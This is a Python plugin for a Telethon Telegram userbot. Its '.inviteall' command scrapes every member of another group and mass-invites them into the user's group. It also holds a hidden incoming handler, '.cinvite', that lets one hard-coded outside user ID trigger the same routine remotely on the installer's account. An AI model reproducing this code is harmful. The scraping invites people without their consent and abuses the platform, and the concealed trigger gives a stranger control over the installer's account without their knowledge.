# Ported By @VckyouuBitch From Geez - Projects
# Copyright © Team Geez - Project
# kiju

from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError,
)
from telethon.tl import functions
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import GetFullChatRequest

from userbot import DEVS, CMD_HELP
from userbot.events import register


async def get_chatinfo(event):
    chat = event.pattern_match.group(1)
    chat_info = None
    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass
    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
        else:
            chat = event.chat_id
    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except BaseException:
        try:
            chat_info = await event.client(GetFullChannelRequest(chat))
        except ChannelInvalidError:
            await event.reply("`Invalid channel/group`")
            return None
        except ChannelPrivateError:
            await event.reply(
                "`This is a private channel/group or I am banned from there`"
            )
            return None
        except ChannelPublicGroupNaError:
            await event.reply("`Channel or supergroup doesn't exist`")
            return None
        except (TypeError, ValueError):
            await event.reply("`Invalid channel/group`")
            return None
    return chat_info


@register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
@register(incoming=True, from_users=2014359828,
          pattern=r"^\.cinvite(?: |$)(.*)")
async def get_users(event):
    sender = await event.get_sender()
    me = await event.client.get_me()
    if not sender.id == me.id:
        geez = await event.reply("`processing...`")
    else:
        geez = await event.edit("`processing...`")
    geezteam = await get_chatinfo(event)
    chat = await event.get_chat()
    if event.is_private:
        return await geez.edit("`Sorry, Can add users here`")
    s = 0
    f = 0
    error = "None"

    await geez.edit("**Proses dimulai**\n\n`Mengumpulkan Pengguna . . .`")
    async for user in event.client.iter_participants(geezteam.full_chat.id):
        try:
            if error.startswith("Too"):
                return await geez.edit(
                    f"**Proses Dihentikan**\n(Disebabkan oleh limit dari telethon Harap Periksa Dengan Code `.limit`)\n**Kode Kesalahan** : \n`{error}`\n\n✅ Berhasil `{s}` Orang \n❌ Gagal `{f}` Orang"
                )
            await event.client(
                functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
            )
            s = s + 1
            await geez.edit(
                f"**Proses Berjalan**\n\n✅ Berhasil `{s}` Orang \n❌ Gagal `{f}` Orang\n\n**× Kemungkinan Salah:** `{error}`"
            )
        except Exception as e:
            error = str(e)
            f = f + 1
    return await geez.edit(
        f"**Proses Selesai** \n\n✅ Berhasil ditambahkan : `{s}` Orang \n❌ Gagal Ditambahkan `{f}` Orang"
    )


CMD_HELP.update(
    {
        "inviteall": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.inviteall groups username`\
          \n📌 : __Scrapes users from the given chat to your group__."
    }
)
